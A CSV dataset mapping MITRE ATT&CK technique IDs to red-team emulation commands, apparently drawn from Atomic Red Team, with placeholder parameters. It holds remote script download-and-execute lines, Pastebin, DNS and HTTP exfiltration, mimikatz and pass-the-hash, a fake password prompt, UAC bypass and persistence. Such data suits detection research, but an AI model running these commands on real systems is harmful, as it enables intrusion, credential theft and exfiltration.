mitre_id,command
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer # id_8578"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } } # id_1628"
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1531,passwd #{user_account} #enter admin password > enter new password > confirm new password
T1219,"start-process ""#{remotepc_path}"" # id_1057"
T1553,"openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/c=us/st=denial/l=springfield/o=dis/cn=www.example.com"" -out #{cert_filename} cp #{cert_filename} /etc/pki/ca-trust/source/anchors/ update-ca-trust"
T1518,"reg query ""hkey_local_machine\software\microsoft\internet explorer"" /v svcversion  "
T1020,"$SAMPLEDATA = ""SAMPLE DATA FOR EXFILTRATION TEST"" SET-CONTENT -PATH ""#{SAMPLEFILE}"" -VALUE $SAMPLEDATA $FTPURL = ""#{FTPSERVER}"" $CREDS = GET-CREDENTIAL -CREDENTIAL ""#{CREDENTIALS}"" INVOKE-WEBREQUEST -URI $FTPURL -METHOD PUT -INFILE ""#{SAMPLEFILE}"" -CREDENTIAL $CREDS"
T1552,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') sessiongopher -noninteractive -consoleoutput
T1546,"$filterargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=set-wmiinstance -class __eventfilter -namespace ""root\subscription"" -arguments $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; scriptingengine='vbscript'; scripttext=' set objws = createobject(""wscript.shell"") objws.run ""notepad.exe"", 0, true '} $consumer=set-wmiinstance -namespace ""root\subscription"" -class activescripteventconsumer -arguments $consumerargs $filtertoconsumerargs = @{ filter = $filter; consumer = $consumer; } $filtertoconsumerbinding = set-wmiinstance -namespace 'root/subscription' -class '__filtertoconsumerbinding' -arguments $filtertoconsumerargs"
T1546,"reg add ""hklm\software\microsoft\windows\windows error reporting\hangs"" /v debugger /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1053,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""eventvwr.msc"" /sc onlogon /rl highest /f echo let's run the schedule task ... schtasks /run /tn ""eventviewerbypass""   "
T1216,"cscript.exe /b c:\windows\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:#{remote_payload}"" # id_9537"
T1072,"""%programfiles(x86)%/#{pdq_deploy_exe}"""
T1005,"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }  "
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack # id_5677"
T1614,localectl status
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }"
T1547,"reg add hklm\system\currentcontrolset\control\bootverificationprogram /v imagepath /t reg_sz /d ""#{malicious_file}"""
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 5  "
T1550,#{crackmapexec_exe} #{domain} -u #{user_name} -h #{ntlm} -x #{command} 
T1053,"$xml = [system.io.file]::readalltext(""#{xml_path}"") invoke-cimmethod -classname ps_scheduledtask -namespace ""root\microsoft\windows\taskscheduler"" -methodname ""registerbyxml"" -arguments @{ force = $true; xml =$xml; }"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack # id_2710"
T1105,"PUSHD #{DESTINATION_PATH} ECHO VAR FILEOBJECT = WSCRIPT.CREATEOBJECT(""SCRIPTING.FILESYSTEMOBJECT"");VAR NEWFILE = FILEOBJECT.CREATETEXTFILE(""ATOMICTESTFILET1105.JS"", TRUE);NEWFILE.WRITELINE(""THIS IS AN ATOMIC RED TEAM TEST FILE FOR T1105. IT SIMULATES HOW OSTAP WORMS ACCROSS NETWORK SHARES AND DRIVES."");NEWFILE.CLOSE(); > ATOMICTESTT1105.JS CSCRIPT.EXE ATOMICTESTT1105.JS //E:JSCRIPT DEL ATOMICTESTT1105.JS /Q >NUL 2>&1 DEL ATOMICTESTFILET1105.JS /Q >NUL 2>&1 POPD"
T1134,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique namedpipe -verbose # id_2772
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1217,"find / -path ""*/.config/chromium/*/bookmarks"" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null"
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'
T1090,export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port} curl #{test_url} # id_3409
T1136,pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_9151"
T1550,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/kevin-robertson/invoke-thehash/01ee90f934313acc7d09560902443c18694ed0eb/invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target #{target} -username #{user_name} -hash #{ntlm} -command #{command} # id_4685
T1548,"""#{uacme_exe}"""
T1056,"pwd_spoof=$(osascript -e 'display dialog ""to perform a security update macos needs your passphrase."" with title ""macos security update"" default answer """" with icon stop with hidden answer') echo $pwd_spoof   "
T1134,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit"" # id_6653"
T1564,"import-module exchangeonlinemanagement $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password connect-exchangeonline -credential $credential -erroraction:silentlycontinue new-inboxrule -mailbox #{target_mailbox} -name #{mail_rulename} -subjectorbodycontainswords (""phish"",""malware"",""hacked"") -confirm:$false -deletemessage:$true   "
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } }  "
T1489,sudo kill -sigterm $(pgrep #{process_name})
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}  "
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1127,"COPY ""#{FILENAME}"" %TEMP%\HELLO.JS #{JSCPATH}\#{JSCNAME} %TEMP%\HELLO.JS"
T1014,sudo modprobe #{rootkit_name}
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh 
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""#{image_file}"" -out ""$home\result.ps1"" $scriptcontent = get-content ""$home\result.ps1"" -raw $base64pattern = ""(?<=^|[^a-za-z0-9+/])(?:[a-za-z0-9+/]{4})*(?:[a-za-z0-9+/]{2}(==)?|[a-za-z0-9+/]{3}=)?(?=$|[^a-za-z0-9+/])"" $base64strings = [regex]::matches($scriptcontent, $base64pattern) | foreach-object { $_.value } $base64strings | set-content ""$home\decoded.ps1"" $decodedcontent = get-content ""$home\decoded.ps1"" -raw $decodedtext = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($decodedcontent)) $textpattern = '^.+' $textmatches = [regex]::matches($decodedtext, $textpattern) | foreach-object { $_.value } $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"" # id_5310"
T1217,get-childitem -path c:\users\ -filter bookmarks -recurse -erroraction silentlycontinue -force  
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx"" "
T1204,"$url = ""#{url}"" $outfile = ""#{outfile}"" invoke-webrequest -uri $url -outfile $outfile -usebasicparsing $process = start-process -filepath $outfile -passthru -windowstyle normal $process.id | out-file ""$env:temp\click-fix-pid.txt""  "
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region # id_5460"
T1021,evil-winrm -i #{destination_address} -u #{user_name} -p #{password} # id_4402
T1572,nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
T1530,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching all blobs from container $($row.containername) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for blob content $containerfolderpath = join-path $storageaccountoutputpath $row.containername if (-not (test-path -path $containerfolderpath)) { new-item -itemtype directory -path $containerfolderpath } az storage blob download-batch --destination $containerfolderpath --source $row.containername --connection-string $connectionstring } } } # id_6311"
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }  "
T1098,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $aadapplication = new-azureadapplication -displayname ""#{application_name}"" $serviceprincipal = new-azureadserviceprincipal -appid $aadapplication.appid #$aadapplication = get-azureadapplication -filter ""displayname eq '#{application_name}'"" #get service principal of microsoft graph resource api $graphsp = get-azureadserviceprincipal -filter ""displayname eq 'microsoft graph'"" #initialize requiredresourceaccess for microsoft graph resource api $requiredgraphaccess = new-object microsoft.open.azuread.model.requiredresourceaccess $requiredgraphaccess.resourceappid = $graphsp.appid $requiredgraphaccess.resourceaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.resourceaccess] #set application permissions $applicationpermissions = @('#{application_permission}') $reqpermission = $graphsp.approles | where-object {$_.value -eq $applicationpermissions} if($reqpermission) { $resourceaccess = new-object microsoft.open.azuread.model.resourceaccess $resourceaccess.type = ""role"" $resourceaccess.id = $reqpermission.id #add required app permission $requiredgraphaccess.resourceaccess.add($resourceaccess) } else { write-host ""app permission $permission not found in the graph resource api"" -foregroundcolor red } #add required resource accesses $requiredresourcesaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.requiredresourceaccess] $requiredresourcesaccess.add($requiredgraphaccess) #set permissions in existing azure ad app set-azureadapplication -objectid $aadapplication.objectid -requiredresourceaccess $requiredresourcesaccess $serviceprincipal = get-azureadserviceprincipal -filter ""appid eq '$($aadapplication.appid)'"" new-azureadserviceapproleassignment -objectid $serviceprincipal.objectid -principalid $serviceprincipal.objectid -resourceid $graphsp.objectid -id $reqpermission.id"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1219,"start-process ""#{splashtop_path}"""
T1543,"sc.exe create #{service_name} binpath= ""#{binary_path}"" start=#{startup_type} type=#{service_type} sc.exe start #{service_name} "
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""ping 8.8.8.8`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"" "
T1546,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'   "
T1539,"killall 'google chrome' sleep 1 open -a ""/applications/google chrome.app/contents/macos/google chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/whitechocolatemacademianut/chocolate -d cookies -p 1337 # id_1695"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds  "
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 }"
T1550,#{crackmapexec_exe} #{domain} -u #{user_name} -h #{ntlm} -x #{command} # id_6178
T1505,new-webglobalmodule -name #{module_name} -image #{dll_path} 
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start # id_7889
T1649,"$ARCHIVE=""$ENV:PUBLIC\T1649\ATOMIC_CERTS.ZIP"" $EXFILPATH=""$ENV:PUBLIC\T1649\CERTS"" ADD-TYPE -ASSEMBLY ""SYSTEM.IO.COMPRESSION.FILESYSTEM"" REMOVE-ITEM $(SPLIT-PATH $EXFILPATH) -RECURSE -FORCE -ERRORACTION IGNORE MKDIR $EXFILPATH | OUT-NULL FOREACH ($CERT IN (GCI CERT:\CURRENTUSER\MY)) { EXPORT-CERTIFICATE -CERT $CERT -FILEPATH $EXFILPATH\$($CERT.FRIENDLYNAME).CER} [IO.COMPRESSION.ZIPFILE]::CREATEFROMDIRECTORY($EXFILPATH, $ARCHIVE)"
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path $termsrvdll -destination ""$home\atomictest.dll"" $newservicedll = ""$home\atomictest.dll"" $registrypath = ""hklm:\system\currentcontrolset\services\termservice\parameters"" # check if the registry key exists if (test-path -path $registrypath) { # modify the servicedll value in the registry set-itemproperty -path $registrypath -name ""servicedll"" -value $newservicedll write-host ""servicedll value in the registry has been updated to: $newservicedll"" } else { write-host ""registry key not found. make sure the 'termservice\parameters' key exists."" }"
T1652,kextfind
T1486,openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"" # id_5386"
T1486,which_openssl=`which openssl` $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size} $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path} $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}  
T1552,$usernameinfo = (get-childitem env:username).value get-childitem -hidden c:\users\$usernameinfo\appdata\roaming\microsoft\credentials\ get-childitem -hidden c:\users\$usernameinfo\appdata\local\microsoft\credentials\
T1072,"""%programfiles(x86)%/#{radmin_exe}""   "
T1201,aws iam get-account-password-policy
T1571,test-netconnection -computername #{domain} -port #{port} # id_3129
T1187,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"" "
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""   "
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1562,"set-itemproperty -path #{customsdpath} -name ""customsd"" -value ""o:syg:syd:(d;;0x1;;;wd)"""
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"" # id_5274"
T1482,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" get-netdomaintrust get-netforesttrust get-addomain get-adgroupmember administrators -recursive ([system.directoryservices.activedirectory.domain]::getcurrentdomain()).getalltrustrelationships()"
T1140,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd  "
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" # id_3509"
T1580,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}   
